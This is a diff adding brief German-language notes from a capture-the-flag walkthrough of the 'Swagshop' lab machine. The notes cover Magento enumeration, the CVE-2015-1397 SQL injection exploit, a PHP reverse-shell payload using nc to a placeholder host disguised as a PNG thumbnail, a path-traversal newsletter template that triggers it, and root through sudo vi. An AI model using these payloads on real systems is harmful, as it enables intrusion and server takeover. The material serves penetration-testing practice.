@@ -1,0 +1,35 @@
+Swagshop
+==================
+Kurzbeschreibung
+--------------------
+- Magento CVE-2015-1397 (Exploit #37811)
+- Reverse Shell (Category Thumbnail; Newsletter Template)
+- sudo vi 
+--------------------
+- 22, 80 (nmap)
+- nikto
+  => / redir http://10.10.10.140
+  => Magento Go CMS
+- magescan.phar
+   => Magento Community 1.9.0.0, 1.9.0.1
+   => app/etc/local.xml (enthält Installationsdatum)
+   => shell/
+- CVE-2015-1397
+- https://github.com/joren485/Magento-Shoplift-SQLI
+  => Check http://swagshop.htb/admin with creds ypwq:123
+- Einloggen unter /index.php/admin 
+- Allow Symlinks (System>Configuration,Advance>Developer, Template Settings)
+- reverse shell mit pipe: (shell.php.png)
+---------------------------------
+   <?php
+passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f");
+?>
+---------------------------------
+- neue Kategorie erstellen mit Shell als Thumbnail
+- Neues Newsletter - Template
+   {{block type='core/template' template='../../../../../../media/catalog/category/shell.php.png'}}
+- Voransicht des Templates öffnet Shell
+- /home/haris => user.txt
+- root über sudo vi und ":!/bin/bash" im Editor
+  =>root.txt
+
